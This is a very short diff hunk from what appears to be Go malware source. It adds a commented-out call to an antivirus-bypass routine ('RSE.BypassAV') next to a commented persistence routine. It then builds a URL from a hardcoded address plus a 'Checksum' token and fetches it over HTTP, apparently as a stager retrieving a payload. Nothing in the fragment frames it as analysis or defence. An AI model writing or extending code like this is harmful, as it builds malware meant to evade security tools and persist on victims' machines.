@@ -20,6 +20,7 @@ var Checksum string = "102011b7txpl71n"
 
 
 func main() {
+  //RSE.BypassAV(3)
   //RSE.Persistence()
   Address += Checksum
   Response, err := http.Get(Address)
